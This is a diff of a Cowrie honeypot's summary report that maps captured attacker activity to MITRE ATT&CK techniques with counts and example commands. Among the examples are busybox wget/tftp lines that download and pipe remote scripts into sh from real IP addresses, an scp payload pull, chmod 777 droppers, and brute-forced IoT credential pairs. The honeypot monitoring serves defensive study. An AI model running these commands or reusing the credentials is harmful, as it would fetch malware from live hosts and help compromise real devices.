@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-27 22:00:45",
+  "generated": "2026-08-27 23:02:45",
   "totals": {
-    "commands": 570,
-    "login_failed": 2359,
-    "login_success": 155,
-    "sessions": 2604
+    "commands": 589,
+    "login_failed": 3462,
+    "login_success": 160,
+    "sessions": 3740
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2359,
+      "count": 3462,
       "examples": [
         "root / zlxx.",
         "root / root",
@@ -21,14 +21,14 @@
         "root / vizxv"
       ],
       "first": "2026-08-27T00:04:34.466347Z",
-      "last": "2026-08-27T21:59:42.359440Z",
-      "unique_ips": 210
+      "last": "2026-08-27T23:02:41.231690Z",
+      "unique_ips": 214
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 155,
+      "count": 160,
       "examples": [
         "admin / 12345",
         "default / techsupport",
@@ -37,14 +37,14 @@
         "root / taZz@01"
       ],
       "first": "2026-08-27T00:03:05.692337Z",
-      "last": "2026-08-27T21:58:53.600744Z",
-      "unique_ips": 113
+      "last": "2026-08-27T23:02:20.803001Z",
+      "unique_ips": 116
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 96,
+      "count": 98,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -53,14 +53,14 @@
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/"
       ],
       "first": "2026-08-27T00:20:02.855145Z",
-      "last": "2026-08-27T21:58:58.096213Z",
-      "unique_ips": 17
+      "last": "2026-08-27T22:25:11.605082Z",
+      "unique_ips": 18
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 69,
+      "count": 73,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
@@ -69,14 +69,14 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-27T00:20:02.855145Z",
-      "last": "2026-08-27T21:58:58.091325Z",
-      "unique_ips": 16
+      "last": "2026-08-27T22:25:12.560050Z",
+      "unique_ips": 17
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 16,
+      "count": 18,
       "examples": [
         "uname -s -v -n -r -m",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -85,8 +85,8 @@
         "uname -s -m"
       ],
       "first": "2026-08-27T06:14:53.381666Z",
-      "last": "2026-08-27T21:58:58.096213Z",
-      "unique_ips": 12
+      "last": "2026-08-27T23:02:33.108274Z",
+      "unique_ips": 13
     },
     {
       "id": "T1033",
@@ -206,15 +206,15 @@
   "unmapped": [
     [
       "shell",
-      38
+      40
     ],
     [
       "sh",
-      38
+      40
     ],
     [
       "system",
-      37
+      39
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -226,7 +226,7 @@
     ],
     [
       "enable",
-      22
+      24
     ],
     [
       "linuxshell",
@@ -261,6 +261,18 @@
       11
     ],
     [
+      "ping; sh",
+      4
+    ],
+    [
+      "/bin/busybox STC",
+      4
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
+      4
+    ],
+    [
       ">/tmp/.codi && cd /tmp/",
       4
     ],
@@ -270,18 +282,6 @@
     ],
     [
       ">/dev/.codi && cd /dev/",
-      4
-    ],
-    [
-      ">/mnt/.codi && cd /mnt/",
-      4
-    ],
-    [
-      ">/var/run/.codi && cd /var/run/",
-      4
-    ],
-    [
-      ">/var/tmp/.codi && cd /var/tmp/",
       4
     ]
   ]
